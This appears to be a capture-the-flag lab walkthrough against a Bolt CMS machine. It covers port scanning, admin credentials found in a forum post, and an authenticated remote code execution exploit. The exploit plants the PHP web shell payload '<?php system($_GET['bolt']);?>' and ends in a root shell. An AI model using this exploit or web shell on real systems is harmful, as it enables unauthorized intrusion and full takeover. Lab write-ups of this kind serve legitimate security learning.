# Enumeration Phase
## ping scan
```sh
❯ ping 10.10.202.204
PING 10.10.202.204 (10.10.202.204) 56(84) bytes of data.
64 bytes from 10.10.202.204: icmp_seq=1 ttl=63 time=56.4 ms
^C
--- 10.10.202.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 56.350/56.350/56.350/0.000 ms
```
## nmap scan
```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    (PHP 7.2.32-1)
```
Notes:
- CMS is running on port 8000
- Username found Bolt
## http check
### 10.10.202.204
```html
default apache page
```
### 10.10.202.204:8000
Notes:
- In "Latest Entries" we see "Message for IT Department" that says:
	- "Hey guys,
		i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!
		
		Regards,
		
		Jake (Admin)"
- "Message From Admin" says:
	- "Hello Everyone,
		Welcome to this site, myself Jake and my username is bolt .I am still new to this CMS so it can take awhile for me to get used to this CMS but believe me i have some great content coming up for you all!
		
		Regards,
		
		Jake (Admin)"
- Collected data:
	- real name: Jake (Admin) username: bolt passowrd: boltadmin123
## manual work
added 'bolt' to the url and got redirected to Bolt CMS login page
![[Pasted image 20221030005700.png]]
## testing creds
- username: jake , bolt
- password: boltadmin123
Notes: accessed the cms system successfully 
# Weaponization Phase
In the Bolt management page we see a file upload capability:
![[Pasted image 20221030110645.png]]
So let's use pentestmonkey's php reverse shell and upload it to the CMS system.
## searchsploit
```sh
Bolt CMS 3.7.0 - Authenticated Remote Code Execution           | php/webapps/48296.py
```
# Exploitation Phase
```sh
❯ python3 bolt_rce.py http://10.10.210.50:8000 bolt boltadmin123
[i] Author: Musyoka
[+] Cross Site Requetst Forgery Token Geneated Successfully
[+] Login Token assigned: w-G25ZaXA9_YHdmHT4wUpmiWOm6R2YGmrBa3AMBBclA

===> lOGGING IN PLEASE BE PATIENT
[+] Username: bolt and password: boltadmin123 supplied is valid
[+] Profile Token assigned: Eyo0T58lKezjb3NLSN1wZZjdE7FEiuwz6XHtGcEDXM8

[+] Email to be used: 0x9778@protonmail.com
[+] Injecting payload in the username field
[+] Payload used: <?php system($_GET['bolt']);?>
[+] Payload injected in the Username successfully

[+] Showcase CSRF Token: oIC1hzQpTsqPHVnTICnUkBfN5OxYL8lGilkuq35kiDw

[+] Used token 033b8622b16002c021029a0696 to create V9Vm1P.php
shell created has the name V9Vm1P.php
"..\/..\/..\/public\/files\/V9Vm1P.php"

[+] Command shell session 1 opened
[+] To Get a Reverse shell Press: 1
[!] Type exit to leave the terminal

Bolt-RCE$ 
```
# Priv-Esc Phase
```sh
Bolt-RCE$ whoami
root

Bolt-RCE$ 
```